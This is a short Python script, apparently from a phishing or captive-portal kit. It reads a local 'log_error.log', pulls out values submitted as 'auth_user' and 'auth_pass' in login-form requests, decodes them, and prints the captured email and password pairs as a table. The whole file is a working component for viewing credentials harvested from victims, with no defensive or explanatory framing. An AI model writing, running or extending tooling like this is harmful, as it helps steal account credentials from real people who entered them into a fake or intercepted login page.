#!/usr/bin/env python3

import sys
import time
import os
import re
import argparse



Path_St = "/".join(os.path.abspath(__file__).split('/'))[:-16]
class Get_Info :
    
      def __init__(self):
        self.Get_Password()
      def Get_Password(self):
     
         print(" "+"-"*79)
         print("| "+f"{'       EMAIL    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
         print(" "+"-"*79)
         with open(Path_St+'log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
         for line in Log_read :   
            if "auth_" in  line :
               line = line.split('auth_user=')
               line = str(line[-1]).split('auth_pass=')
               line = str(line).replace('&accept=Login','').replace('%40','@').replace('&',' ')\
               .replace('\\n','').replace("['",'').replace("']",'').replace("'",'').split(',')
               print("| "+"  "+f"{   line[0]    :<35}","| "+"  "+f"{      line[1]    :<35} |")
         
if __name__ =='__main__':
     Get_Info()

